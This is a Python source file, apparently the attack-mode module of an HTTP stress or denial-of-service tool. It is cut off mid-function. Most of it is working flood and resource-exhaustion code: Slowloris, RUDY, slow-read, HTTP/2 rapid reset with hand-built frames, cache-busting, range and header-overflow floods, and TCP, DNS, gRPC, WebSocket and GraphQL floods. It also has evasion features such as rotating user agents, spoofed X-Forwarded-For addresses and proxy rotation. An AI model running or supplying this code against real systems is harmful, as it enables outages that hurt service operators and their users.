"""
modes/runners.py v9
===================
New modes:
  - grpc          gRPC unary flood (requires grpcio)
  - websocket     WebSocket message flood (requires aiohttp ws support)
  - graphql       GraphQL query flood with variable injection

Enhanced:
  - proxy rotation pool support
  - mTLS (client cert) auth
  - plugin on_request / on_response / on_error hooks
  - JSON path + regex variable extraction in scenario
  - assert_body validation in scenario steps
"""

import asyncio, aiohttp, ssl, os, random, socket, time, json, re, struct
from typing import Optional, List
from core.stats  import Stats, Rec
from core.config import Cfg

UA_POOL = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2) AppleWebKit/605.1.15 Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Android 14; Mobile; rv:121.0) Gecko/121.0 Firefox/121.0",
    "curl/8.5.0", "Go-http-client/2.0", "python-httpx/0.26.0", "Wget/1.21.3",
]
REFERRERS = [
    "https://www.google.com/", "https://www.bing.com/",
    "https://www.facebook.com/", "https://t.co/", "",
]


def _ssl_ctx(no_verify=False, cert_file="", key_file=""):
    ctx = ssl.create_default_context()
    if no_verify:
        ctx.check_hostname = False
        ctx.verify_mode    = ssl.CERT_NONE
    if cert_file and key_file:
        ctx.load_cert_chain(cert_file, key_file)
    return ctx


def _rec(wid, url, method, status, ms, bin=0, bout=0, err=None, phase="main") -> Rec:
    return Rec(status=status, ms=ms, bytes_in=bin, bytes_out=bout,
               error=err, ts=time.time(), worker_id=wid,
               url=url, method=method, phase=phase)


def _classify(e: Exception) -> str:
    s = str(e).lower(); n = type(e).__name__
    if "timeout"           in s or "timed out"    in s: return "Timeout"
    if "refused"           in s:                        return "ConnectionRefused"
    if "reset"             in s:                        return "ConnectionReset"
    if "connect"           in s:                        return "ConnectError"
    if "ssl"               in s or "tls"          in s: return "SSLError"
    if "too many"          in s:                        return "TooManyConns"
    if "name or service"   in s or "nodename"     in s: return "DNSError"
    if "server disconnected" in s:                      return "ServerDisconnected"
    return n[:40]


def _hdrs(extra: int = 0) -> dict:
    h = {
        "User-Agent":      random.choice(UA_POOL),
        "Accept":          random.choice(["text/html,*/*", "application/json", "*/*"]),
        "Accept-Language": random.choice(["en-US,en;q=0.9", "ar,en;q=0.8", "fr-FR,fr;q=0.9"]),
        "Accept-Encoding": "gzip, deflate, br",
        "Cache-Control":   random.choice(["no-cache", "max-age=0"]),
        "X-Forwarded-For": ".".join(str(random.randint(1, 254)) for _ in range(4)),
        "Referer":         random.choice(REFERRERS),
    }
    if extra:
        for i in range(extra):
            h[f"X-C{i:04d}"] = "A" * random.randint(64, 256)
    return h


def _proxy_url(cfg: Cfg) -> Optional[str]:
    """Returns a proxy URL — rotates through pool if configured."""
    if cfg.proxy.rotate:
        return random.choice(cfg.proxy.rotate)
    return cfg.proxy.url or None


# ── Template ──────────────────────────────────────────────────────────────────
class Tpl:
    def __init__(self, src): self._src = src; self._seq = 0

    def render(self, ctx=None):
        out = self._src
        for k, v in (ctx or {}).items():
            out = out.replace("{{" + k + "}}", str(v))
        self._seq += 1
        out = out.replace("{{seq}}", str(self._seq))
        for a, b in re.findall(r'\{\{random\.int\((\d+),(\d+)\)\}\}', out):
            out = out.replace("{{random.int(%s,%s)}}" % (a, b),
                              str(random.randint(int(a), int(b))), 1)
        while "{{random.uuid}}" in out:
            import uuid
            out = out.replace("{{random.uuid}}", str(uuid.uuid4()), 1)
        while "{{random.email}}" in out:
            n = random.choice(["alice","bob","carol","dave","eve"])
            out = out.replace("{{random.email}}", f"{n}{random.randint(1,999)}@test.com", 1)
        while "{{random.word}}" in out:
            out = out.replace("{{random.word}}",
                random.choice(["alpha","beta","gamma","delta","epsilon","zeta"]), 1)
        return out


# ── Auth ──────────────────────────────────────────────────────────────────────
class AuthMgr:
    def __init__(self, cfg, session):
        self._cfg = cfg; self._session = session
        self._tok = ""; self._exp = 0.0

    async def headers(self):
        a = self._cfg.auth
        if a.type == "none":   return {}
        if a.type == "basic":
            import base64
            c = base64.b64encode(f"{a.username}:{a.password}".encode()).decode()
            return {"Authorization": f"Basic {c}"}
        if a.type == "bearer": return {"Authorization": f"Bearer {a.token}"}
        if a.type == "mtls":   return {}  # handled at SSL context level
        if a.type in ("oauth2", "session"):
            if time.time() >= self._exp - 10:
                await self._refresh()
            return {"Authorization": f"Bearer {self._tok}"}
        return {}

    async def _refresh(self):
        a = self._cfg.auth
        try:
            if a.type == "oauth2":
                async with self._session.post(
                    a.token_url,
                    data={"grant_type":"client_credentials",
                          "client_id": a.client_id,
                          "client_secret": a.client_secret},
                    timeout=aiohttp.ClientTimeout(total=10)
                ) as r:
                    d = await r.json()
                    self._tok = d.get("access_token", "")
                    self._exp = time.time() + d.get("expires_in", 3600)
            elif a.type == "session":
                async with self._session.post(
                    a.login_url, data=a.login_body,
                    timeout=aiohttp.ClientTimeout(total=10)
                ) as r:
                    rb = await r.json()
                    val = rb
                    for part in a.token_path.split("."):
                        val = val.get(part, {}) if isinstance(val, dict) else {}
                    self._tok = str(val) if val else ""
                    self._exp = time.time() + 3600
        except Exception:
            pass


# ── Plugin dispatch helper ─────────────────────────────────────────────────────
def _plugin_request(plugins, wid, url, method, headers, body):
    """Run on_request hooks; return (final_headers, final_body)."""
    for p in plugins:
        try:
            result = p.on_request(wid, url, method, headers, body)
            if result:
                headers = result.get("headers", headers)
                body    = result.get("body", body)
        except Exception:
            pass
    return headers, body


def _plugin_response(plugins, wid, url, status, ms, body_bytes):
    for p in plugins:
        try: p.on_response(wid, url, status, ms, body_bytes)
        except Exception: pass


def _plugin_error(plugins, wid, url, error):
    for p in plugins:
        try: p.on_error(wid, url, error)
        except Exception: pass


# ── 1. HTTP Flood ─────────────────────────────────────────────────────────────
async def http_flood(wid, session, cfg: Cfg, stats: Stats,
                     auth=None, phase="main", tpl=None, plugins=None):
    plugins = plugins or []
    while True:
        ah = await auth.headers() if auth else {}
        hdrs = {**_hdrs(), **cfg.headers, **ah}
        body = (tpl.render() if tpl else cfg.body).encode() if (tpl or cfg.body) else None
        hdrs, body = _plugin_request(plugins, wid, cfg.url, cfg.method, hdrs, body)
        proxy = _proxy_url(cfg)
        t0 = time.perf_counter(); err = None; status = None; bin_ = 0
        try:
            async with session.request(
                cfg.method, cfg.url, headers=hdrs, data=body,
                allow_redirects=cfg.redirects, proxy=proxy,
                timeout=aiohttp.ClientTimeout(total=cfg.timeout_s)
            ) as resp:
                rb = await resp.read()
                status = resp.status; bin_ = len(rb)
                _plugin_response(plugins, wid, cfg.url, status,
                                 (time.perf_counter()-t0)*1000, rb)
        except asyncio.TimeoutError:              err = "Timeout"
        except aiohttp.ClientConnectorError as e: err = _classify(e)
        except Exception as e:                    err = _classify(e)
        if err:
            _plugin_error(plugins, wid, cfg.url, err)
        ms = (time.perf_counter()-t0)*1000
        stats.record(_rec(wid, cfg.url, cfg.method, status, ms,
                          bin_, len(body) if body else 0, err, phase))
        if cfg.rate_limit > 0:
            # Token bucket: precise rate limiting without drift
            from core import globals as _g
            if _g._rate_bucket is not None:
                await _g._rate_bucket.acquire()
            else:
                await asyncio.sleep(1.0 / cfg.rate_limit)
        elif cfg.delay_ms > 0:
            await asyncio.sleep(cfg.delay_ms / 1000)
        else:
            await asyncio.sleep(0)


# ── 2. Keep-alive flood ───────────────────────────────────────────────────────
async def http_keepalive_flood(wid, session, cfg: Cfg, stats: Stats,
                                phase="main", plugins=None):
    plugins = plugins or []
    burst = getattr(cfg, "_brain_burst", 15)
    stagger = getattr(cfg, "_brain_stagger_ms", 2.0)
    await asyncio.sleep(wid * stagger / 1000 * 0.1)
    while True:
        for _ in range(burst):
            hdrs = {**_hdrs(), **cfg.headers,
                    "Connection": "keep-alive"}
            body = cfg.body.encode() if cfg.body else None
            hdrs, body = _plugin_request(plugins, wid, cfg.url, cfg.method, hdrs, body)
            proxy = _proxy_url(cfg)
            t0 = time.perf_counter(); err = None; status = None; bin_ = 0
            try:
                async with session.request(
                    cfg.method, cfg.url, headers=hdrs, data=body,
                    allow_redirects=False, proxy=proxy,
                    timeout=aiohttp.ClientTimeout(total=cfg.timeout_s)
                ) as resp:
                    rb = await resp.read()
                    status = resp.status; bin_ = len(rb)
                    _plugin_response(plugins, wid, cfg.url, status,
                                     (time.perf_counter()-t0)*1000, rb)
            except asyncio.TimeoutError:              err = "Timeout"
            except aiohttp.ClientConnectorError as e: err = _classify(e)
            except Exception as e:                    err = _classify(e)
            if err:
                _plugin_error(plugins, wid, cfg.url, err)
            ms = (time.perf_counter()-t0)*1000
            stats.record(_rec(wid, cfg.url, cfg.method, status, ms,
                              bin_, len(body) if body else 0, err, phase))
        await asyncio.sleep(0.001)


# ── 3. Slowloris ──────────────────────────────────────────────────────────────
async def slowloris_worker(wid, host, port, path, stats: Stats, cfg: Cfg):
    use_ssl = cfg.url.startswith("https")
    stagger = getattr(cfg, "_brain_stagger_ms", 2.0)
    await asyncio.sleep(wid * stagger / 1000)
    while True:
        t0 = time.perf_counter()
        try:
            kw = {"ssl": _ssl_ctx(cfg.no_verify, cfg.auth.cert_file, cfg.auth.key_file)} if use_ssl else {}
            r, w = await asyncio.wait_for(
                asyncio.open_connection(host, port, **kw), timeout=5.0)
            w.write(
                f"GET {path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"User-Agent: {random.choice(UA_POOL)}\r\n"
                f"Accept-Language: en-US,en;q=0.9\r\n".encode()
            )
            await w.drain()
            for _ in range(30):
                await asyncio.sleep(random.uniform(5, 15))
                try:
                    w.write(f"X-Keep: {random.randint(1, 9999)}\r\n".encode())
                    await w.drain()
                    stats.record(_rec(wid, cfg.url, "SLOWLORIS", 200,
                                      (time.perf_counter()-t0)*1000))
                except Exception:
                    break
            w.close()
        except Exception as e:
            stats.record(_rec(wid, cfg.url, "SLOWLORIS", None,
                              (time.perf_counter()-t0)*1000, err=_classify(e)))
        await asyncio.sleep(0.5)


# ── 4. RUDY ───────────────────────────────────────────────────────────────────
async def rudy_worker(wid, host, port, path, stats: Stats, cfg: Cfg):
    use_ssl = cfg.url.startswith("https")
    stagger = getattr(cfg, "_brain_stagger_ms", 2.0)
    await asyncio.sleep(wid * stagger / 1000)
    body_size = random.randint(1_000_000, 10_000_000)
    while True:
        t0 = time.perf_counter()
        try:
            kw = {"ssl": _ssl_ctx(cfg.no_verify, cfg.auth.cert_file, cfg.auth.key_file)} if use_ssl else {}
            r, w = await asyncio.wait_for(
                asyncio.open_connection(host, port, **kw), timeout=5.0)
            w.write(
                f"POST {path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"Content-Length: {body_size}\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"User-Agent: {random.choice(UA_POOL)}\r\n\r\n".encode()
            )
            await w.drain()
            sent = 0
            while sent < body_size:
                chunk = random.randint(1, 3)
                w.write(b"A" * chunk)
                await w.drain()
                sent += chunk
                await asyncio.sleep(random.uniform(5, 15))
                stats.record(_rec(wid, cfg.url, "RUDY", 200,
                                  (time.perf_counter()-t0)*1000))
            w.close()
        except Exception as e:
            stats.record(_rec(wid, cfg.url, "RUDY", None,
                              (time.perf_counter()-t0)*1000, err=_classify(e)))
        await asyncio.sleep(0.5)


# ── 5. Slow-read ──────────────────────────────────────────────────────────────
async def slow_read_worker(wid, host, port, path, stats: Stats, cfg: Cfg):
    use_ssl = cfg.url.startswith("https")
    stagger = getattr(cfg, "_brain_stagger_ms", 2.0)
    await asyncio.sleep(wid * stagger / 1000)
    while True:
        t0 = time.perf_counter()
        try:
            kw = {"ssl": _ssl_ctx(cfg.no_verify, cfg.auth.cert_file, cfg.auth.key_file)} if use_ssl else {}
            r, w = await asyncio.wait_for(
                asyncio.open_connection(host, port, **kw), timeout=5.0)
            w.write(
                f"GET {path} HTTP/1.1\r\n"
                f"Host: {host}\r\nUser-Agent: {random.choice(UA_POOL)}\r\n\r\n".encode()
            )
            await w.drain()
            total_read = 0
            while True:
                try:
                    chunk = await asyncio.wait_for(r.read(1), timeout=10)
                    if not chunk:
                        break
                    total_read += 1
                    await asyncio.sleep(random.uniform(0.5, 2.0))
                except asyncio.TimeoutError:
                    break
            stats.record(_rec(wid, cfg.url, "SLOW-READ", 200,
                              (time.perf_counter()-t0)*1000, total_read))
            w.close()
        except Exception as e:
            stats.record(_rec(wid, cfg.url, "SLOW-READ", None,
                              (time.perf_counter()-t0)*1000, err=_classify(e)))
        await asyncio.sleep(0.1)


# ── 6. Cache bypass ───────────────────────────────────────────────────────────
async def cache_bypass_worker(wid, session, stats: Stats, cfg: Cfg):
    base = cfg.url.rstrip("/")
    params = ["?_={v}", "?nocache={v}", "?v={v}&t={t}", "?cb={v}", "?bust={v}"]
    while True:
        v = random.randint(1, 99999999); t = int(time.time())
        url = base + random.choice(params).format(v=v, t=t)
        hdrs = {**_hdrs(), "Cache-Control": "no-cache, no-store", "Pragma": "no-cache"}
        proxy = _proxy_url(cfg)
        t0 = time.perf_counter(); err = None; status = None; bin_ = 0
        try:
            async with session.request(
                "GET", url, headers=hdrs, allow_redirects=False, proxy=proxy,
                timeout=aiohttp.ClientTimeout(total=cfg.timeout_s)
            ) as resp:
                rb = await resp.read(); status = resp.status; bin_ = len(rb)
        except asyncio.TimeoutError:              err = "Timeout"
        except aiohttp.ClientConnectorError as e: err = _classify(e)
        except Exception as e:                    err = _classify(e)
        stats.record(_rec(wid, url, "CACHE-BYPASS", status,
                          (time.perf_counter()-t0)*1000, bin_, len(url), err))
        await asyncio.sleep(0.005)


# ── 7. Range ──────────────────────────────────────────────────────────────────
async def range_attack_worker(wid, session, stats: Stats, cfg: Cfg):
    while True:
        n = random.randint(5, 20); size = random.randint(50000, 5000000)
        ranges = []
        for _ in range(n):
            s2 = random.randint(0, size-1)
            ranges.append(f"{s2}-{min(s2+random.randint(1,512),size-1)}")
        hdrs = {**_hdrs(), "Range": "bytes=" + ",".join(ranges)}
        t0 = time.perf_counter(); err = None; status = None; bin_ = 0
        try:
            async with session.request(
                "GET", cfg.url, headers=hdrs,
                timeout=aiohttp.ClientTimeout(total=cfg.timeout_s)
            ) as resp:
                rb = await resp.read(); status = resp.status; bin_ = len(rb)
        except asyncio.TimeoutError:              err = "Timeout"
        except aiohttp.ClientConnectorError as e: err = _classify(e)
        except Exception as e:                    err = _classify(e)
        stats.record(_rec(wid, cfg.url, "RANGE", status,
                          (time.perf_counter()-t0)*1000, bin_, 0, err))
        await asyncio.sleep(0.01)


# ── 8. TLS ────────────────────────────────────────────────────────────────────
async def tls_renegotiation_worker(wid, host, port, stats: Stats, cfg: Cfg):
    if not cfg.url.startswith("https"):
        await http_flood(wid, None, cfg, stats); return
    stagger = getattr(cfg, "_brain_stagger_ms", 2.0)
    await asyncio.sleep(wid * stagger / 1000 * 0.2)
    while True:
        t0 = time.perf_counter()
        try:
            ctx = _ssl_ctx(cfg.no_verify, cfg.auth.cert_file, cfg.auth.key_file)
            r, w = await asyncio.wait_for(
                asyncio.open_connection(host, port, ssl=ctx), timeout=8.0)
            w.write((f"GET / HTTP/1.0\r\nHost: {host}\r\n"
                     f"User-Agent: {random.choice(UA_POOL)}\r\n\r\n").encode())
            await w.drain()
            try: await asyncio.wait_for(r.read(256), timeout=2.0)
            except asyncio.TimeoutError: pass
            stats.record(_rec(wid, cfg.url, "TLS-RENEG", 200,
                              (time.perf_counter()-t0)*1000, 256, 64))
            w.close()
            try: await asyncio.wait_for(w.wait_closed(), timeout=0.5)
            except Exception: pass
        except asyncio.TimeoutError:
            stats.record(_rec(wid, cfg.url, "TLS-RENEG", None,
                              (time.perf_counter()-t0)*1000, err="Timeout"))
        except Exception as e:
            stats.record(_rec(wid, cfg.url, "TLS-RENEG", None,
                              (time.perf_counter()-t0)*1000, err=_classify(e)))
        await asyncio.sleep(0.001)


# ── 9. H2 Reset ───────────────────────────────────────────────────────────────
async def http2_rapid_reset_worker(wid, session, stats: Stats, cfg: Cfg):
    def _h2_preface():      return b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
    def _h2_settings():     return b"\x00\x00\x00\x04\x00\x00\x00\x00\x00"
    def _h2_settings_ack(): return b"\x00\x00\x00\x04\x01\x00\x00\x00\x00"
    def _h2_rst(sid):
        return b"\x00\x00\x04\x03\x00" + struct.pack(">I", sid) + struct.pack(">I", 0x8)
    def _h2_headers(sid, host, path):
        hb = b"\x82\x86\x84" + b"\x41" + bytes([len(host)]) + host.encode()
        return struct.pack(">I", len(hb))[1:] + b"\x01\x04" + struct.pack(">I", sid) + hb

    use_ssl = cfg.url.startswith("https")
    BURST = 50
    stagger = getattr(cfg, "_brain_stagger_ms", 2.0)
    await asyncio.sleep(wid * stagger / 1000 * 0.1)
    from urllib.parse import urlparse
    p2 = urlparse(cfg.url)
    h = p2.hostname; pt = p2.port or (443 if use_ssl else 80); path = p2.path or "/"
    while True:
        t0 = time.perf_counter()
        try:
            if use_ssl:
                ctx = ssl.create_default_context()
                ctx.set_alpn_protocols(["h2"])
                if cfg.no_verify: ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
                r, w = await asyncio.wait_for(asyncio.open_connection(h, pt, ssl=ctx), timeout=5.0)
            else:
                r, w = await asyncio.wait_for(asyncio.open_connection(h, pt), timeout=5.0)
            w.write(_h2_preface() + _h2_settings()); await w.drain()
            try: await asyncio.wait_for(r.read(512), timeout=1.0)
            except asyncio.TimeoutError: pass
            w.write(_h2_settings_ack())
            payload = b""
            for i in range(BURST):
                sid = 2*i+1
                payload += _h2_headers(sid, h, path) + _h2_rst(sid)
            w.write(payload); await w.drain()
            try: await asyncio.wait_for(r.read(256), timeout=0.5)
            except asyncio.TimeoutError: pass
            ms = (time.perf_counter()-t0)*1000
            for _ in range(BURST):
                stats.record(_rec(wid, cfg.url, "H2-RESET", 200,
                                  ms/BURST, 32, len(payload)//BURST))
            w.close()
        except asyncio.TimeoutError:
            stats.record(_rec(wid, cfg.url, "H2-RESET", None,
                              (time.perf_counter()-t0)*1000, err="Timeout"))
        except Exception as e:
            stats.record(_rec(wid, cfg.url, "H2-RESET", None,
                              (time.perf_counter()-t0)*1000, err=_classify(e)))
        await asyncio.sleep(0.001)


# ── 10. Header overflow ───────────────────────────────────────────────────────
async def header_overflow_worker(wid, session, stats: Stats, cfg: Cfg):
    while True:
        hdrs = {**_hdrs(extra=random.randint(100, 250))}
        t0 = time.perf_counter(); err = None; status = None; bin_ = 0
        try:
            async with session.request(
                cfg.method, cfg.url, headers=hdrs,
                timeout=aiohttp.ClientTimeout(total=cfg.timeout_s)
            ) as resp:
                rb = await resp.read(); status = resp.status; bin_ = len(rb)
        except Exception as e:
            s2 = str(e)
            for c in ["431", "413", "400"]:
                if c in s2: status = int(c); break
            if status is None: err = _classify(e)
        stats.record(_rec(wid, cfg.url, "HDR-OVERFLOW", status,
                          (time.perf_counter()-t0)*1000, bin_, 0, err))
        await asyncio.sleep(0.01)


# ── 11. Connection flood ──────────────────────────────────────────────────────
async def connection_flood(wid, host, port, stats: Stats, cfg: Cfg):
    use_ssl = cfg.url.startswith("https")
    stagger = getattr(cfg, "_brain_stagger_ms", 2.0)
    await asyncio.sleep(wid * stagger / 1000)
    while True:
        t0 = time.perf_counter()
        try:
            kw = {"ssl": _ssl_ctx(cfg.no_verify)} if use_ssl else {}
            r, w = await asyncio.open_connection(host, port, **kw)
            stats.record(_rec(wid, cfg.url, "TCP", 200,
                              (time.perf_counter()-t0)*1000))
            w.close(); await w.wait_closed()
        except Exception as e:
            stats.record(_rec(wid, cfg.url, "TCP", None,
                              (time.perf_counter()-t0)*1000, err=_classify(e)))
        await asyncio.sleep(0.01)


# ── 12. DNS flood ─────────────────────────────────────────────────────────────
async def dns_flood(wid, hostname, stats: Stats, cfg: Cfg):
    loop = asyncio.get_event_loop()
    while True:
        t0 = time.perf_counter()
        try:
            await loop.run_in_executor(None, socket.gethostbyname, hostname)
            stats.record(_rec(wid, cfg.url, "DNS", 200,
                              (time.perf_counter()-t0)*1000))
        except Exception as e:
            stats.record(_rec(wid, cfg.url, "DNS", None,
                              (time.perf_counter()-t0)*1000, err=f"DNS:{_classify(e)}"))
        await asyncio.sleep(0.05)


# ── 13. Payload flood ─────────────────────────────────────────────────────────
async def payload_flood(wid, session, stats: Stats, cfg: Cfg):
    while True:
        size = random.choice([4096, 16384, 65536, 262144, 1048576])
        data = os.urandom(size)
        hdrs = {**_hdrs(), "Content-Type": "application/octet-stream"}
        t0 = time.perf_counter()
        try:
            async with session.post(
                cfg.url, data=data, headers=hdrs,
                timeout=aiohttp.ClientTimeout(total=cfg.timeout_s)
            ) as resp:
                rb = await resp.read()
                stats.record(_rec(wid, cfg.url, "PAYLOAD", resp.status,
                                  (time.perf_counter()-t0)*1000, len(rb), size))
        except asyncio.TimeoutError:
            stats.record(_rec(wid, cfg.url, "PAYLOAD", None,
                              (time.perf_counter()-t0)*1000, err="Timeout"))
        except Exception as e:
            stats.record(_rec(wid, cfg.url, "PAYLOAD", None,
                              (time.perf_counter()-t0)*1000, err=_classify(e)))
        await asyncio.sleep(0.02)


# ── 14. Scenario ──────────────────────────────────────────────────────────────
async def scenario_worker(wid, session, stats: Stats, cfg: Cfg,
                           auth=None, plugins=None):
    plugins = plugins or []
    tpl = Tpl(cfg.data_tpl) if cfg.data_tpl else None
    while True:
        ctx = {}
        ah = await auth.headers() if auth else {}
        for step in cfg.scenario:
            hdrs = {**_hdrs(), **step.headers, **ah}
            body = step.body
            for k, v in ctx.items():
                body = body.replace("{{" + k + "}}", str(v))
            if tpl:
                body = tpl.render(ctx)
            bd = body.encode() if body else None
            hdrs, bd = _plugin_request(plugins, wid, step.url or cfg.url,
                                        step.method, hdrs, bd)
            proxy = _proxy_url(cfg)
            t0 = time.perf_counter(); err = None; status = None; bin_ = 0
            try:
                async with session.request(
                    step.method, step.url or cfg.url,
                    headers=hdrs, data=bd, proxy=proxy,
                    timeout=aiohttp.ClientTimeout(total=cfg.timeout_s)
                ) as resp:
                    rb = await resp.read()
                    status = resp.status; bin_ = len(rb)
                    _plugin_response(plugins, wid, step.url or cfg.url,
                                     status, (time.perf_counter()-t0)*1000, rb)

                    # JSON path extraction
                    if step.extract:
                        try:
                            rj = json.loads(rb)
                            for var, key in step.extract.items():
                                val = rj
                                for part in key.split("."):
                                    val = val.get(part) if isinstance(val, dict) else None
                                if val is not None:
                                    ctx[var] = val
                        except Exception:
                            pass

                    # Regex extraction
                    if step.extract_regex:
                        rb_str = rb.decode(errors="replace")
                        for var, pattern in step.extract_regex.items():
                            m = re.search(pattern, rb_str)
                            if m:
                                ctx[var] = m.group(1) if m.lastindex else m.group(0)

                    # Assertions
                    if step.assert_status and status != step.assert_status:
                        err = f"Assert:{status}!={step.assert_status}"
                    if step.assert_body and step.assert_body.encode() not in rb:
                        err = f"BodyAssert:missing '{step.assert_body[:20]}'"

            except asyncio.TimeoutError: err = "Timeout"
            except Exception as e:       err = _classify(e)
            if err:
                _plugin_error(plugins, wid, step.url or cfg.url, err)
            ms = (time.perf_counter()-t0)*1000
            stats.record(_rec(wid, step.url or cfg.url, step.method,
                               status, ms, bin_, len(bd) if bd else 0, err))
            if step.delay_ms:
                await asyncio.sleep(step.delay_ms / 1000)
        await asyncio.sleep(0.05)


# ── 15. Chaos ─────────────────────────────────────────────────────────────────
async def chaos_worker(wid, session, stats: Stats, cfg: Cfg):
    while True:
        if cfg.chaos_lat_ms > 0:
            await asyncio.sleep(cfg.chaos_lat_ms / 1000 * random.uniform(0.5, 2.0))
        if random.random() < cfg.chaos_err:
            et = random.choice(["Timeout","ConnectError","ServerDisconnected","HTTP:503"])
            stats.record(_rec(wid, cfg.url, cfg.method, None,
                               random.uniform(1, 500), err=f"Chaos:{et}"))
            await asyncio.sleep(0.01); continue
        t0 = time.perf_counter()
        try:
            async with session.request(
                cfg.method, cfg.url, headers=_hdrs(),
                timeout=aiohttp.ClientTimeout(total=cfg.timeout_s)
            ) as resp:
                rb = await resp.read()
                stats.record(_rec(wid, cfg.url, cfg.method, resp.status,
                                  (time.perf_counter()-t0)*1000, len(rb)))
        except Exception as e:
            stats.record(_rec(wid, cfg.url, cfg.method, None,
                               (time.perf_counter()-t0)*1000, err=_classify(e)))
        await asyncio.sleep(0.01)


# ── 16. Mixed ─────────────────────────────────────────────────────────────────
async def mixed_worker(wid, session, host, port, path, stats: Stats,
                        cfg: Cfg, plugins=None):
    choices = ["http_flood","http_flood","keepalive","keepalive",
               "cache_bypass","range","header_overflow"]
    m = random.choice(choices)
    if   m == "http_flood":     await http_flood(wid, session, cfg, stats, plugins=plugins)
    elif m == "keepalive":      await http_keepalive_flood(wid, session, cfg, stats, plugins=plugins)
    elif m == "cache_bypass":   await cache_bypass_worker(wid, session, stats, cfg)
    elif m == "range":          await range_attack_worker(wid, session, stats, cfg)
    elif m == "header_overflow":await header_overflow_worker(wid, session, stats, cfg)
    else:                       await connection_flood(wid, host, port, stats, cfg)


# ── 17. gRPC flood ────────────────────────────────────────────────────────────
async def grpc_flood(wid, stats: Stats, cfg: Cfg):
    """
    gRPC unary flood. Requires: pip install grpcio grpcio-tools
    Falls back to HTTP POST if grpcio not available.
    """
    try:
        import grpc
        import grpc.aio
    except ImportError:
        # Fallback: send raw HTTP/2 POST to gRPC endpoint
        await http_flood(wid, None, cfg, stats)
        return

    gc = cfg.grpc
    if not gc.service or not gc.method:
        await http_flood(wid, None, cfg, stats)
        return

    from urllib.parse import urlparse
    p = urlparse(cfg.url)
    target = f"{p.hostname}:{p.port or (443 if gc.use_tls else 80)}"

    if gc.use_tls and not cfg.no_verify:
        creds = grpc.ssl_channel_credentials()
    else:
        creds = None

    try:
        if creds:
            channel = grpc.aio.secure_channel(target, creds)
        else:
            channel = grpc.aio.insecure_channel(target)

        # Generic raw bytes approach (no proto needed)
        method_path = f"/{gc.service}/{gc.method}"
        msg_bytes = json.dumps(json.loads(gc.message_json)).encode()

        while True:
            t0 = time.perf_counter()
            try:
                call = channel.unary_unary(
                    method_path,
                    request_serializer=lambda x: x,
                    response_deserializer=lambda x: x,
                )
                await call(msg_bytes, timeout=cfg.timeout_s)
                ms = (time.perf_counter()-t0)*1000
                stats.record(_rec(wid, cfg.url, "gRPC", 200, ms))
            except grpc.aio.AioRpcError as e:
                ms = (time.perf_counter()-t0)*1000
                stats.record(_rec(wid, cfg.url, "gRPC", None, ms,
                                  err=f"gRPC:{e.code().name}"))
            except Exception as e:
                ms = (time.perf_counter()-t0)*1000
                stats.record(_rec(wid, cfg.url, "gRPC", None, ms,
                                  err=_classify(e)))
            await asyncio.sleep(0)
    except Exception as e:
        stats.record(_rec(wid, cfg.url, "gRPC", None, 0, err=_classify(e)))


# ── 18. WebSocket flood ───────────────────────────────────────────────────────
async def websocket_flood(wid, session, stats: Stats, cfg: Cfg, plugins=None):
    """WebSocket message flood. URL must be ws:// or wss://."""
    plugins = plugins or []
    ws_url = cfg.url.replace("http://", "ws://").replace("https://", "wss://")
    wsc = cfg.ws
    tpl = Tpl(wsc.message_tpl) if wsc.message_tpl else None
    while True:
        t0 = time.perf_counter()
        try:
            kw = {}
            if wsc.subprotocol:
                kw["protocols"] = [wsc.subprotocol]
            async with session.ws_connect(
                ws_url, timeout=aiohttp.ClientWSTimeout(ws_receive=cfg.timeout_s),
                **kw
            ) as ws:
                msg = tpl.render() if tpl else wsc.message
                await ws.send_str(msg)
                try:
                    resp = await asyncio.wait_for(ws.receive(), timeout=cfg.timeout_s)
                    ms = (time.perf_counter()-t0)*1000
                    body = resp.data.encode() if isinstance(resp.data, str) else (resp.data or b"")
                    _plugin_response(plugins, wid, ws_url, 101, ms, body)
                    err = None
                    if wsc.expect and wsc.expect not in str(resp.data):
                        err = f"WS:BadResponse"
                    stats.record(_rec(wid, ws_url, "WS", 101, ms,
                                      len(body), len(msg), err))
                except asyncio.TimeoutError:
                    stats.record(_rec(wid, ws_url, "WS", None,
                                      (time.perf_counter()-t0)*1000, err="Timeout"))
        except Exception as e:
            stats.record(_rec(wid, ws_url, "WS", None,
                              (time.perf_counter()-t0)*1000, err=_classify(e)))
        await asyncio.sleep(0.01)


# ── 19. GraphQL flood ─────────────────────────────────────────────────────────
async def graphql_flood(wid, session, stats: Stats, cfg: Cfg, plugins=None):
    """GraphQL query flood with variable injection via templates."""
    plugins = plugins or []
    tpl = Tpl(cfg.data_tpl) if cfg.data_tpl else None
    base_query = cfg.body or '{"query": "{ __typename }"}'
    while True:
        payload = tpl.render() if tpl else base_query
        try:
            body = json.loads(payload)
        except Exception:
            body = {"query": payload}
        body_bytes = json.dumps(body).encode()
        hdrs = {**_hdrs(), **cfg.headers,
                "Content-Type": "application/json",
                "Accept": "application/json"}
        hdrs, body_bytes = _plugin_request(plugins, wid, cfg.url, "POST", hdrs, body_bytes)
        proxy = _proxy_url(cfg)
        t0 = time.perf_counter(); err = None; status = None; bin_ = 0
        try:
            async with session.post(
                cfg.url, data=body_bytes, headers=hdrs, proxy=proxy,
                timeout=aiohttp.ClientTimeout(total=cfg.timeout_s)
            ) as resp:
                rb = await resp.read()
                status = resp.status; bin_ = len(rb)
                _plugin_response(plugins, wid, cfg.url, status,
                                 (time.perf_counter()-t0)*1000, rb)
                # Check for GraphQL errors
                try:
                    rj = json.loads(rb)
                    if rj.get("errors"):
                        err = f"GQL:{rj['errors'][0].get('message','error')[:40]}"
                except Exception:
                    pass
        except asyncio.TimeoutError:              err = "Timeout"
        except aiohttp.ClientConnectorError as e: err = _classify(e)
        except Exception as e:                    err = _classify(e)
        if err:
